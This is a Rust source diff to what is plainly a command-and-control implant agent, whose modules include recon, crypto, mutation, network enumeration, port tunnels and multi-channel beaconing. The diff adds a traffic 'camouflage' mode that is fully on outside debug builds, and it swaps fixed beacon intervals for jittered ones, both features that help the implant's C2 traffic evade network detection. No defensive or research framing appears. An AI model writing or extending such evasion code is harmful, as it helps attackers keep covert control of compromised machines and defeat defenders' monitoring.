@@ -8,6 +8,7 @@ mod executor;
 mod recon;
 mod crypto;
 mod mutation;
+mod camouflage;
 mod network;
 mod port_handler;
 
@@ -18,6 +19,7 @@ use recon::SystemInfo;
 use crypto::CryptoManager;
 use network::{NetworkConfig, ConnectionMethod, PortScanner, NetworkEnumerator, MultiBeacon};
 use port_handler::{PortHandler, PortForwardingTunnel, ProtocolType};
+use camouflage::CamouflageMode;
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -85,6 +87,12 @@ async fn run_agent(
         seed
     };
 
+    let camouflage_mode = if config.debug {
+        CamouflageMode::None
+    } else {
+        CamouflageMode::Full
+    };
+
     let mut communicator = communicator::Communicator::new(
         &config.c2_url,
         config.c2_port,
@@ -92,7 +100,9 @@ async fn run_agent(
         config.beacon_interval,
         crypto,
         &mutation_seed,
+        camouflage_mode,
     );
+    info!("Traffic camouflage: {}", if config.debug { "disabled (debug)" } else { "full" });
 
     let mut reconnect_count = 0;
     let max_reconnects = 10;
@@ -145,7 +155,8 @@ async fn run_agent(
                         break;
                     }
 
-                    info!("📡 Beacon sent (interval: {}s)", config.beacon_interval);
+                    let next_interval = communicator.next_beacon_interval().await;
+                    info!("📡 Beacon sent (next in: {}s)", next_interval);
 
                     // Check for incoming commands
                     match communicator.receive_command().await {
@@ -182,8 +193,8 @@ async fn run_agent(
                         }
                     }
 
-                    // Sleep before next beacon
-                    sleep(Duration::from_secs(config.beacon_interval)).await;
+                    // Sleep with jitter before next beacon
+                    sleep(Duration::from_secs(next_interval)).await;
                 }
             }
             Err(e) => {
